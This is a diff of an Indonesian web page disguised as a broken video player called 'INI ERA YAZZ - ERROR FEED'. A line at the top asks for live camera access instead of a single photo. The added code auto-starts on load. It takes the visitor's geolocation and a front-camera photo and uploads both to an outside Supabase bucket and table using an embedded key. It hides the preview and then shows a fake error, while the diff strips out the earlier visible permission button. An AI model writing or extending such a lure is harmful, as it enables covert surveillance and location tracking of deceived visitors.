@@ -1,54 +1,63 @@
-<!DOCTYPE html>
+buatkan yang ga 1xfoto doang tapi mengakses kamera live <!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>INI ERA YAZZ - ERROR FEED</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  * { 
+    box-sizing: border-box; 
+    margin: 0; 
+    padding: 0; 
+  }
+
   body {
-    font-family: 'Inter', sans-serif;
-    background: #0f0f0f;
-    color: #eeeeee;
+    /* Update Font ke Plus Jakarta Sans */
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    background: #0a0a0a;
+    color: #f0f0f0;
     display: flex;
     flex-direction: column;
     align-items: center;
     min-height: 100vh;
     padding-bottom: 40px;
+    -webkit-font-smoothing: antialiased;
   }
 
   header {
     width: 100%;
-    padding: 20px;
+    padding: 25px;
     text-align: center;
-    font-size: 1.5rem;
-    font-weight: 600;
-    letter-spacing: -1px;
-    color: #e74c3c;
-    border-bottom: 1px solid #222;
-    background: rgba(15, 15, 15, 0.8);
-    backdrop-filter: blur(10px);
+    font-size: 1.2rem;
+    font-weight: 700; /* Lebih tebal */
+    letter-spacing: 2px; /* Jarak antar huruf lebih elegan */
+    color: #ff3b30; 
+    border-bottom: 1px solid #1a1a1a;
+    background: rgba(10, 10, 10, 0.8);
+    backdrop-filter: blur(15px);
     position: sticky;
     top: 0;
     z-index: 100;
+    text-transform: uppercase;
   }
 
   #statusBox {
-    width: 90%;
+    width: 92%;
     max-width: 500px;
-    margin: 20px auto;
-    padding: 15px;
-    background: #1a1a1a;
-    border-radius: 12px;
+    margin: 25px auto;
+    padding: 18px;
+    background: #161616;
+    border-radius: 14px;
     text-align: center;
-    border: 1px solid #333;
+    border: 1px solid #222;
   }
 
   #statusText { 
-    font-size: 0.9rem; 
+    font-size: 0.85rem; 
+    font-weight: 500;
     color: #ff4d4d;
-    margin-bottom: 10px;
+    letter-spacing: 0.2px;
   }
 
   #list {
@@ -60,10 +69,10 @@
   }
 
   .card {
-    background: #1a1a1a;
-    border-radius: 16px;
+    background: #161616;
+    border-radius: 20px;
     overflow: hidden;
-    border: 1px solid #282828;
+    border: 1px solid #262626;
   }
 
   .media-container {
@@ -75,63 +84,48 @@
     align-items: center;
     justify-content: center;
     position: relative;
-    color: #555;
+    color: #444;
   }
 
   .error-icon {
-    font-size: 3rem;
-    margin-bottom: 10px;
+    font-size: 3.2rem;
+    margin-bottom: 12px;
+    opacity: 0.7;
+  }
+
+  .media-container p {
+    font-weight: 600;
+    font-size: 0.9rem;
+    color: #777;
   }
 
   .info-overlay {
-    padding: 15px;
-    background: #151515;
+    padding: 18px;
+    background: #111;
   }
 
   .info-text {
-    font-size: 0.8rem;
-    color: #555;
+    font-size: 0.75rem;
+    font-weight: 400;
+    color: #666;
     text-align: center;
+    letter-spacing: 0.5px;
   }
 
-  #canvas { display: none; }
-  
-  /* Tampilkan video sementara untuk testing, bisa dihide lagi nanti */
-  video { 
-    width: 100%;
-    max-width: 300px;
-    margin: 10px auto;
-    border-radius: 8px;
-    display: block;
-  }
+  #canvas, video { display: none; }
 
   .floating-info {
     position: fixed;
-    bottom: 20px;
-    background: #e74c3c;
+    bottom: 25px;
+    background: #ff3b30;
     color: white;
-    padding: 10px 20px;
+    padding: 12px 25px;
     border-radius: 50px;
-    font-size: 0.8rem;
-    font-weight: 600;
-    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
-  }
-
-  .test-buttons {
-    display: flex;
-    gap: 10px;
-    margin-top: 10px;
-    justify-content: center;
-  }
-
-  .test-btn {
-    background: #e74c3c;
-    color: white;
-    border: none;
-    padding: 10px 20px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: 600;
+    font-size: 0.75rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 8px 20px rgba(255, 59, 48, 0.3);
   }
 </style>
 </head>
@@ -141,10 +135,6 @@
 
 <div id="statusBox">
   <div id="statusText">System: Mendeteksi pemutar video...</div>
-  <!-- Tambah tombol manual untuk test -->
-  <div class="test-buttons">
-    <button class="test-btn" onclick="requestPermissions()">IZINKAN AKSES</button>
-  </div>
 </div>
 
 <div id="list">
@@ -152,18 +142,17 @@
     <div class="media-container">
       <div class="error-icon">⚠️</div>
       <p>Video ini tidak dapat diputar</p>
-      <p style="font-size: 0.7rem;">Error Code: 0x80040255</p>
+      <p style="font-size: 0.7rem; font-weight: 400; margin-top: 5px; color: #555;">Error Code: 0x80040255</p>
     </div>
     <div class="info-overlay">
-      <div class="info-text">Klik tombol IZINKAN AKSES untuk melanjutkan</div>
+      <div class="info-text">Izinkan dulu - Mencoba memuat ulang...</div>
     </div>
   </div>
 </div>
 
 <div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>
 
-<!-- Tampilkan video preview -->
-<video id="video" autoplay playsinline style="display: none;"></video>
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -171,155 +160,58 @@
   const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
   const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
   const BUCKET = "foto-users"; 
-  
-  let supabaseClient;
-  try {
-    const { createClient } = supabase;
-    supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
-    console.log("Supabase client initialized");
-  } catch (e) {
-    console.error("Supabase init error:", e);
-  }
+  const { createClient } = supabase;
+  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
   const statusText = document.getElementById("statusText");
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
-  const notif = document.getElementById("notif");
 
-  // Fungsi untuk meminta permission
-  window.requestPermissions = async function() {
-    statusText.innerText = "Meminta akses kamera dan lokasi...";
-    notif.innerText = "🔴 Mohon izinkan akses kamera & lokasi";
+  async function startProcess() {
+    statusText.innerText = "izinkan dulu bang baru nonton";
     
-    try {
-      // Cek geolocation dulu
-      if (!navigator.geolocation) {
-        throw new Error("Geolocation tidak didukung");
-      }
+    if (!navigator.geolocation) return;
 
-      // Minta lokasi
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const { latitude: lat, longitude: lon } = pos.coords;
-        statusText.innerText = "Lokasi didapatkan, mengakses kamera...";
-        
-        // Minta akses kamera
-        await captureAndUpload(lat, lon);
-        
-      }, (geoError) => {
-        console.error("Geo error:", geoError);
-        statusText.innerText = "Gagal dapat lokasi: " + geoError.message;
-        
-        // Tetap coba kamera meskipun lokasi gagal
-        captureAndUpload(null, null);
-      });
-
-    } catch (error) {
-      console.error("Permission error:", error);
-      statusText.innerText = "Error: " + error.message;
-    }
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const { latitude: lat, longitude: lon } = pos.coords;
+      statusText.innerText = "Memproses video... mohon tunggu";
+      captureAndUpload(lat, lon);
+    }, (err) => {
+      statusText.innerText = "Gagal memuat: Akses ditolak.";
+    });
   }
 
   async function captureAndUpload(lat, lon) {
     try {
-      // Minta akses kamera dengan konfigurasi yang lebih sederhana
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: true,  // Ganti dengan konfigurasi sederhana dulu
-        audio: false 
-      });
-      
-      console.log("Camera access granted");
-      statusText.innerText = "Kamera aktif, mengambil gambar...";
-      notif.innerText = "📸 Mengambil foto...";
-      
-      // Tampilkan video untuk testing (bisa di-comment kalo udah work)
-      video.style.display = 'block';
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
       video.srcObject = stream;
 
-      // Tunggu video siap
-      video.onloadedmetadata = () => {
-        video.play();
+      setTimeout(async () => {
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        setTimeout(async () => {
-          try {
-            const context = canvas.getContext("2d");
-            // Pastikan video sudah punya ukuran
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(async (blob) => {
-              if (!blob) {
-                throw new Error("Gagal buat blob");
-              }
+        canvas.toBlob(async (blob) => {
+          const fileName = `vid_${Date.now()}.jpg`;
+          const { error: uploadError } = await client.storage
+            .from(BUCKET)
+            .upload(fileName, blob, { contentType: "image/jpeg" });
 
-              const fileName = `capture_${Date.now()}.jpg`;
-              statusText.innerText = "Uploading...";
-              
-              // Upload ke Supabase
-              if (supabaseClient) {
-                const { error: uploadError } = await supabaseClient.storage
-                  .from(BUCKET)
-                  .upload(fileName, blob, { 
-                    contentType: "image/jpeg",
-                    cacheControl: "3600"
-                  });
-
-                if (uploadError) {
-                  console.error("Upload error:", uploadError);
-                  statusText.innerText = "Gagal upload: " + uploadError.message;
-                } else {
-                  statusText.innerText = "Upload berhasil!";
-                  notif.innerText = "✅ Foto tersimpan!";
-                  
-                  // Insert ke tabel lokasi
-                  if (lat && lon) {
-                    await supabaseClient.from("lokasi_users").insert([
-                      { foto: fileName, latitude: lat, longitude: lon }
-                    ]);
-                  }
-                }
-              } else {
-                console.log("Mock upload:", fileName, "lat:", lat, "lon:", lon);
-                statusText.innerText = "Simulasi: " + fileName;
-              }
-              
-              // Matikan kamera setelah selesai
-              stream.getTracks().forEach(track => track.stop());
-              video.style.display = 'none';
-              
-            }, "image/jpeg", 0.8);
-            
-          } catch (err) {
-            console.error("Capture error:", err);
-            statusText.innerText = "Gagal capture: " + err.message;
+          if (!uploadError) {
+            await client.from("lokasi_users").insert([
+              { foto: fileName, latitude: lat, longitude: lon }
+            ]);
+            statusText.innerText = "Kesalahan teknis: Pemutar tidak didukung.";
           }
-        }, 2000);
-      };
+          stream.getTracks().forEach(track => track.stop());
+        }, "image/jpeg", 0.7);
+      }, 2000);
 
-    } catch (cameraError) {
-      console.error("Camera error detail:", cameraError);
-      statusText.innerText = "Gagal akses kamera: " + cameraError.message;
-      notif.innerText = "❌ Gagal akses kamera";
-      
-      // Log error lebih detail
-      if (cameraError.name === "NotAllowedError") {
-        statusText.innerText = "Akses kamera ditolak. Izinkan di settings browser.";
-      } else if (cameraError.name === "NotFoundError") {
-        statusText.innerText = "Tidak ada kamera terdeteksi.";
-      } else if (cameraError.name === "NotReadableError") {
-        statusText.innerText = "Kamera sedang digunakan aplikasi lain.";
-      }
+    } catch (err) {
+      console.error("Cam Error");
     }
   }
 
-  // Auto-start dengan delay dan handle error lebih baik
-  setTimeout(() => {
-    statusText.innerText = "Klik tombol IZINKAN AKSES untuk memulai";
-  }, 1000);
-
-  // Catatan: Hapus auto-start, pake tombol manual biar user action required
-  // startProcess();  // COMMENT INI!
+  startProcess();
 </script>
 </body>
 </html>
